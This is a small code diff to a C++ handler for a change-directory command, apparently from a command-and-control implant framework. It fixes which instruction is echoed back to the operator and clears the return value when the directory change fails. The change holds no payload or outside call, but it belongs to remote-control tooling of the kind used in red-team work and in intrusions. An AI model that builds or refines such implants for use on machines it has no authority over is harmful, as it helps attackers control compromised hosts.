@@ -86,9 +86,9 @@ int ChangeDirectory::process(C2Message &c2Message, C2Message &c2RetMessage)
     std::string outCmd;
     const bool changed = changeDirectory(path, outCmd);
 
-    c2RetMessage.set_instruction(c2RetMessage.instruction());
+    c2RetMessage.set_instruction(c2Message.instruction());
     c2RetMessage.set_cmd(path);
-    c2RetMessage.set_returnvalue(outCmd);
+    c2RetMessage.set_returnvalue(changed ? outCmd : std::string{});
     c2RetMessage.set_errorCode(changed ? 0 : 1);
 
     return 0;
